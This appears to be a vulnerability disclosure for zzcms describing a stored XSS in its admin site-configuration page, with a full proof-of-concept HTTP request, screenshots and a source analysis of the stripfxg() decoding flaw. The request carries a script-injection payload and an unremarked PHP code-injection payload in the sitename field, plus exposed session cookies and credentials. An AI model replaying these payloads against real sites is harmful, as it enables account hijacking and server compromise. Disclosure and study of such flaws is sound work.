### /admin/siteconfig.php has stored xss

Vulnerability process

Visit /admin/siteconfig.php and set the site statistics code as follows

![image-20240826214427621](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826214427621.png)

POC

```java
POST /admin/siteconfig.php? HTTP/1.1
Host: zzcms:8786
Content-Length: 2330
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://zzcms:8786
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://zzcms:8786/admin/siteconfig.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: askclassid=0; PHPSESSID=4pj41bdnhl1msnbrl2lljv1iqm; __51cke__=; xywpwx_bakusername=admin; xywpwx_snsjjssbdvqm=aca496e77ae7ceff46c2f8e72f4235d5; qebak_efourcheck=be67da7f3e3c39cd439799a20c67f8b4; XDEBUG_SESSION=PHPSTORM; xywpwx_bakrnd=zPwzzERUvdP4; xywpwx_loginebakckpass=03269d863bac377ff8cfb81722e356e3; xywpwx_baklogintime=1724589372; PassWord=4297f44b13955235245b2497399d7a93; UserName=aaaa; userid=1; __tins__713776=%7B%22sid%22%3A%201724603456590%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201724605579607%7D; __51laig__=34
Connection: keep-alive

sitename=%22%3F%3E%3C%3Fphp+phpinfo%28%29%3B+%2F*&sqldb=zzcms&sqluser=root&sqlpwd=123456&sqlhost=localhost&sqlport=3306&siteurl=http%3A%2F%2Fzzcms%3A8786&address=&img=http%3A%2F%2Fzzcms%3A8786%2Fimage%2Flogo.png&icp=%E8%B1%ABicp%E5%A4%8707007271%E5%8F%B7&webmasteremail=357856668%40qq.com&kftel=400-728-9861&kfmobile=18738134686&kfqq=357856668&sitecount=%3Cscript%3Ealert%2812345%29%3C%2Fscript%3E&channelzs=%E4%BE%9B%E5%BA%94&channeldl=%E6%B1%82%E8%B4%AD&info_num=0&admin_mulu=admin&https=http%3A%2F%2F&tj=%E4%BF%9D%E5%AD%98%E8%AE%BE%E7%BD%AESiteInfo&sdomain=No&whtml=Yes&checksqlin=Yes&allowrepeatreg=Yes&allowrepeataddinfo=No&isaddinfo=Yes&isshowcontact=No&newtable=No&showdlinzs=No&cache_update_time=0&html_update_time=0&liuyanysnum=0&adminlog_day=7&usergr_power%5B%5D=daili&channel%5B%5D=zhanhui&channel%5B%5D=zixun&channel%5B%5D=special&channel%5B%5D=job&channel%5B%5D=ask&channel_zs=g&channel_dl=q&channel_zh=z&channel_zx=i&channel_qy=c&channel_wk=w&channel_zt=s&channel_job=job&channel_bj=b&channel_ask=ask&opensite=Yes&showwordwhenclose=%E7%BD%91%E7%AB%99%E6%9A%82%E6%97%B6%E5%85%B3%E9%97%AD+%21&openuserreg=Yes&openuserregwhy=%E7%BD%91%E7%AB%99%E6%9A%82%E6%97%B6%E5%85%B3%E9%97%AD%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%98%8E%E5%A4%A9%E5%BC%80%E6%94%BE%EF%BC%81&stopip=&siteskin=red13&ztskin=tongyong&zsliststyle=list&pagesize_qt=10&pagesize_ht=20&wordsincomane=&lastwordsincomane=&nowordsincomane=a%7Cb%7Cc%7Cd%7Ce%7Cf%7Cg%7Ch%7Ci%7Cg%7Ck%7Cl%7Cm%7Cn%7Co%7Cp%7Cq%7Cr%7Cs%7Ct%7Cu%7Cv%7Cw%7Cx%7Cw%7Cz%7CA%7CB%7CC%7CD%7CE%7CF%7CG%7CH%7CI%7CG%7CK%7CL%7CM%7CN%7CO%7CP%7CQ%7CR%7CS%7CT%7CU%7CV%7CW%7CX%7CY%7CZ%7C1%7C2%7C3%7C4%7C5%7C6%7C7%7C8%7C9%7C0&stopwords=&isshowad_when_timeend=Yes&showadtext=%E5%B9%BF%E5%91%8A%E4%BD%8D%E5%B7%B2%E5%88%B0%E6%9C%9F&qiangad=Yes&showadvdate=15&duilianadisopen=No&flyadisopen=No&smtpserver=smtp.qq.com&sender=357856668%40qq.com&smtppwd=&whendlsave=Yes&whenuserreg=Yes&whenmodifypassword=Yes&checkistrueemail=No&sendsms=No&smsusername=&smsuserpass=&apikey_mobile_msg=&jifen=Yes&jifen_bilu=1&jf_reg=5&jf_login=1&jf_addreginfo=2&jf_lookmessage=1&jf_look_dl=1&jf_set_adv=2&jf_addinfo=1&maximgsize=20000&maxflvsize=200&allowed_flv=Yes&shuiyin=Yes&addimgXY=right&syurl=http%3A%2F%2Fzzcms2021.com%2F1%2Fuploadfiles%2F2022-10%2F20221002182750503.png&qqlogin=Yes&bbs_set=No&action=saveconfig
```

Then go back to the interface as long as echo has the web stats code.

For example, visit the home page

http://zzcms:8786/, that is, you build the URL home page

![image-20240826214741912](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826214741912.png)



![image-20240826214828282](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826214828282.png)

Accessing any of these can result in xss

Code Analysis

Locate the

```java
$fcontent=$fcontent. "define('sitecount','". str_replace('"','',str_replace("'",'',stripfxg($_POST['sitecount'],true)))."') ;//网站统计代码\r\n";
```

You can see that the stripfxg function is used for our argument

See the stripfxg function

```java
function stripfxg($string,$htmlspecialchars_decode=false,$nl2br=false) {//去反斜杠 
$string=stripslashes($string);//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了
if ($htmlspecialchars_decode==true){
$string=htmlspecialchars_decode($string,ENT_QUOTES);//转html实体符号
}
if ($nl2br==true){
$string=nl2br($string);
}
return $string; 
}
```

You can see that the htmlspecialchars_decode function decodes our input, resulting in no filtering of xss.

On our home page, which is the index

![image-20240827003624069](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827003624069.png)

Successfully spliced into our html code
